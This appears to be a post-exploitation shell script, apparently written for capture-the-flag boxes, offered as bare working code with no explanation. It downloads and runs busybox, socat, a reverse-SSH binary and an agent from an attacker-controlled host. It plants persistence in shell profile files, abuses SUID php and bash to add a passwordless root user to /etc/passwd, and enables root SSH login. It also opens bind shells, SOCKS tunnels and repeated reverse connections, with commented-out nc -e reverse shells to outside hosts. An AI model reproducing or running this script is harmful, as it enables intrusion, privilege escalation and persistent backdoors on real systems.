cd /tmp;
exec 1>./x1
exec 2>./y2
exec 3>./z3
set -x;
TZ=UTC-8;date;
rr="10.10.14.10";
[ ! -z $ip2 ] && rr=$ip2;
rr1="http://${rr}:30088/";
which nc bash python php exec lua perl ruby  awk

s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
uptime;grep NA /etc/os-release 2>&1;
alias ll='ls -al';

which busybox&&(busybox netstat --help 2>&1 |grep programs);
alias nn='busybox netstat -anlp';alias pp='ps aux';alias p='busybox pstree -p';
stty rows 60 columns 400 2>&1 ;
#ll /tmp;which bash;
#which nc&&(nc --help;nc -e /bin/sh ngrok2.xiaomiqiu.cn 34302);
sp=\$PS1;PS1=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
PS6=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS7=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\u\}}
PS8=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS9=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS10=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\u\}}
PS11=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}

echo '  /tmp/busybox setsid sh -c \"i=0;while [ \\\$i -le 9 ];do i=\\\$((i+1));/tmp/upx_reverse-sshx64.bin -v -b 40044 -p 32787 server.natappfree.cc;done\"'
"
 

s2="grep -q sftp-server /proc/\$\$/cmdline&&(
    echo \"[ \$@ ]\$\$ \$PPID\">>non_pil.lrc;ps -ef 2>&1 >>non_pil.lrc;date +%F%T  2>&1 >>non_pil.lrc;cat /proc/\$\$/cmdline>>non_pil.lrc;   
)||( echo non_pil;$s1)"


ln2() {
    ln -s $1 ps ;
    ln -s $1 ash ;
    ln -s $1 netstat ;
   ($1 uptime >>tm) && ln -s $1 wget
    return 0
}


alias ll="ls -al"
export PATH=$PATH:/tmp
export HOME=/tmp
echo "echo  bash_pil;$s1" >~/.bash_profile
ll
cp ~/.bash_profile ~/.ash_profile
echo "$s2" >~/.bashrc
cp ~/.bashrc ~/.ashrc
touch 0a9.txt
if which sudo && (sudo -v &>/dev/null); then echo $(whoami) is sudo_user; else echo $(whoami) is not sudo_user or hasn_t sudo; fi
#if [ 1=1 ]; then echo 123; else echo 45; fi
b="busybox"
b2="/tmp/${b}"
soc="./socat"
soc2="/tmp/${soc}"
#rr1="http://10.10.14.10:30088/"
rr2="${rr1}${b}.bin"
rr3="${rr1}socat.bin"
rr4="file_put_contents('${b}',file_get_contents('${rr2}'));chmod('${b}',0777);"




which busybox && b2=`which busybox`

which busybox &&cp `which busybox` /tmp/ && ln2 ${b2} || (
    if [ ! -f ./busybox ]; then
        if [ ! -f /busybox ]; then
            (which curl && curl -v -o ${b} ${rr2}) || (which wget && wget --no-check-certificate -O ${b} ${rr2}) || (which php && php -n -r $rr4)
        else
            cp /busybox ./
        fi
        ([ -f ${b} ]) && chmod 0777 busybox && ln2 ${b2}
    fi
)

echo 9981;



d0="/bin/sh"
(which ash) && d0=$(which ash)
(which bash) && d0=$(which bash)



# [ -u FILE ] ?|???? FILE ?-???¨??”è??????o?SUID (set user ID)?????o????€?

# php with suid
(which php) &&
    {
        [ -u $(which php) ] &&
            {
                #php -r "posix_setuid(0);posix_setgid(0);posix_initgroups('root',0);system('exec >/tmp/r;(sleep 999)& ');"   ;
                #PHP Warning:  system() has been disabled for security reasons in Command line code on line 1
                grep "tee" /etc/passwd || (
                    php -n -r "copy('/etc/passwd','/etc/passwd.bak');file_put_contents('/etc/passwd','tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp/:${d0}'.PHP_EOL,FILE_APPEND);"
                    {
                        sleep 0.2
                        echo 'su - tee'
                        sleep 0.5
                        echo 123456
                        sleep 0.6
                        echo 123456
                        echo id
                        sleep 0.2
#echo ${d0} \${d0} ;
                        echo cp ${d0} /bin/xxsh
                        echo chmod u+s /bin/xxsh
                        echo ls -al /bin/xxsh
                        echo exit
                        sleep 0.2
                        echo exit
                    } | script /dev/null
                )
            }
    }



# bash with suid
(which bash) &&
{
  [ -u $(which bash) ] &&
      {
          grep "tee::0:0:toor" /etc/passwd || bash -pc '(
          cp /etc/passwd /etc/passwd.bak;
          echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
          )'
      }
}




ssh_1001="(${b2} netstat -an | grep \":1001\") && echo 1001_nice ||
            ( 
                (${b2} netstat -an | grep \":22\") && echo 100122 || sleep 5
                (
                    echo \"ssh -f -o StrictHostKeyChecking=no -N -D 0.0.0.0:1001 tee@127.0.0.1\"
                    sleep 0.6
                    echo 123456
                    sleep 0.6
                    echo 123456
                    echo exit
                    echo exit
                ) | script /tmp/null
            )" ; # for   git_runner  


shsC='(${b2} ps aux|grep -v echo|grep -E "[s][s][h][d]")&&(grep "^PermitRootLogin yes" /etc/ssh/sshd_config&&echo sshd_yes_nice||sed -i "s/^#\?\(PermitRootLogin\)/\1 yes#/g" /etc/ssh/sshd_config)||echo ssh_cfg_fail'

echo 7749;
(id | grep "^uid=0(root)") && (#echo ${b2}
    hostN2=$(cat /etc/hostname)
    
    [ "$HOSTNAME" = "goorm" -o "$hostN2" = "goorm" ] && (
        grep "tee" /etc/passwd ||
            (
                cp /etc/passwd /etc/passwd.bak
                #echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd
            )
        echo "${ssh_1001}" >>/tmp/deal
    )


    [ "$HOSTNAME" = "mailroom" -o "$hostN2" = "mailroom" ] && (
        grep "tee" /etc/passwd ||
            (
                cp /etc/passwd /etc/passwd.bak;
                echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
            )
        echo "${ssh_1001}   ${rr}   ${rr1} " >>/tmp/.deal;
        chattr  +a /tmp/*;
    )


    [ "$HOSTNAME" = "out" ] && sh -c "${shsC}" && /etc/init.d/ssh restart && (
        grep "tee" /etc/passwd ||
            (
                cp /etc/passwd /etc/passwd.bak
                echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd
            )
        #sh -c "${ssh_1001}"# ??′?—?????”¨??€??ˉ1001??ˉ??￡
    )
    
)




echo 8864;
(id | grep "^uid=[0-9]\{1,9\}(runner)") && (
    touch /tmp/keepalive
    sudo bash -c "id;/tmp/ps -ef >/dev/null;
    $shsC
    /etc/init.d/ssh restart"

    grep "tee" /etc/passwd || (
        sudo bash -c 'id;cp /etc/passwd /etc/passwd.bak;echo "tee::0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
        $ssh_1001 '
    )
)




d1="sh -il"
[ -x ./ash ] && d1="/tmp/ash -il"
(which bash) && d1="bash -pil"

#(${soc2} -v tcp-l:9595,bind=127.8.8.8,fork,reuseaddr exec:"$d1",pty,stderr,setsid,sigint,sane &)


#./busybox setsid ./socat -v tcp-l:9595,bind=127.8.8.8,fork,reuseaddr exec:"bash -il",pty,stderr,setsid,sigint,sane

# bash -p -c "{/usr/bin/sv,-w,8,down,/etc/service/sshd}"
# bash -p -c "{/etc/init.d/ssh,stop}"
#/tmp/busybox setsid bash -p -c "/usr/bin/sv -w 8 down /etc/service/sshd"
#  bash -p -c "{netstat,-anlp}"
# bash -p -c "{/usr/bin/sv,status,/etc/service/sshd}"
# bash -p -c "{/usr/bin/sv,-v,start,/etc/service/sshd}"
# bash -p -c "{ps,aux}"

#echo 9980;  ./busybox setsid sleep 1969&


#echo "${soc2}  yyy $HOSTNAME "



./busybox setsid sh -c "( [ -f /tmp/upx_reverse-sshx64.bin ]&&chmod 0777  /tmp/upx_reverse-sshx64.bin&&exit 0;
 [ -x ./wget ] && ./wget --no-check-certificate "${rr1}upx_reverse-sshx64.bin" &&chmod 0777 ./upx_reverse-sshx64.bin )"&




/tmp/./busybox setsid sh -c "
 [ -f /tmp/socat ]&&chmod 0777  /tmp/socat;
which socat && soc2=\"socat\" || (  
    echo ${rr3};
    if [ ! -f ${soc2} ]; then
        [ -x ./wget ] && ./wget --no-check-certificate -O socat ${rr3} && chmod 0777 socat
    else
       chmod 0777  ${soc2};
    fi
)

[ -x ./socat ] || which socat &&./busybox setsid ${soc2} -v tcp-l:9494,bind=127.8.8.8,fork,reuseaddr exec:\"$d1\",pty,stderr,setsid,sigint,sane &
cd /tmp;

#if [ -f /tmp/id ];then /tmp/id;else sleep 4;continue;fi 

    (while true; do
        [ ! -f 0a9.txt ] && break
       #dns_rev77=\$(./busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114  | grep -oP \"(?<=Address:\s).*\d\$\" ); 
       echo \${rr} 9512 ${rr};
        #${soc2} -t5 exec:\"$d1\",pty,stderr,setsid,sigint,sane tcp:\${dns_rev77}:34292;
       if [ -f /tmp/upx_reverse-sshx64.bin ];then chmod 0777 ./upx_reverse-sshx64.bin;upx_reverse-sshx64.bin -v -b 40044 -p 20022 ${rr};else sleep 4;continue;fi
        sleep 9;
    done) &
"&

#tcp:'120.78.177.122':34292
#47.109.99.250:34292
#busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114 | grep -oE "^Address:(.*)$"


echo 1234 flag ${rr3};




./busybox setsid sh -c "#echo \"J${rr1}ZZ\";
ag_xx() {
    [ -f ./agent.linux ] && (
        chmod 0777 ./agent.linux;pwd;
        ./busybox setsid ./agent.linux -l 61080 &
    ) || return 1
    echo \"{sleep,699}\"
    return 0
}

(${b2} ps aux | grep -v echo|grep -E \"[6][1][0][8][0]\") && echo ag_xx_ok || (
    ag_xx || ([ -x ./wget ] && ./wget --no-check-certificate \"${rr1}agent.linux\" && ag_xx)
)"&



 




if [ ! -z ${sp9} ]; then sleep $sp9; fi
date;

#[ -z ${sp5} ] && sleep $sp5
